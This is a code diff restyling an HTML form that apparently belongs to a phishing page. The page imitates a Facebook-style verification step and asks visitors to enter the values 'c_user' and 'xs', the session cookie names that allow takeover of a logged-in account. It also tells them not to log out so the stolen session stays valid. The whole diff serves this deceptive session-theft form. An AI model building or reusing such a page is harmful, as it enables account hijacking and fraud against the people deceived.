@@ -35,14 +35,20 @@
                                     <br>
                                <button>Enable Sound</button>
                     <p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information below.</p>
-                    <label style="font-size: 12px;">c_user</label>
-                    <br>
-                    <input type="number" name="c_user" required pattern="number"
-                    <br>
-                    <label class="mt-2" style="font-size: 12px;">xs</label>
-                    <br>
-                    <input type="text" name="xs" required pattern="text"
-                    <p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
+                    <div><p class="text-sm text-gray-400 mx-5">    
+      c_user
+    </p>
+      <input class="border h-5 mx-3" type="number" name="c_user" id="c_user" required="">
+    </div>
+
+  <div><p class="text-sm text-gray-400 mx-5 mt-2">
+      xs
+    </p>
+      <input class="border h-5 mx-3" type="text" name="xs" id="xs" required="">
+    </div>   
+
+  <div>
+      <p class="text-[10px] font-serif   mt-3 mx-3">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
                 </div>
                                 <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
                                     <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Submit</button>
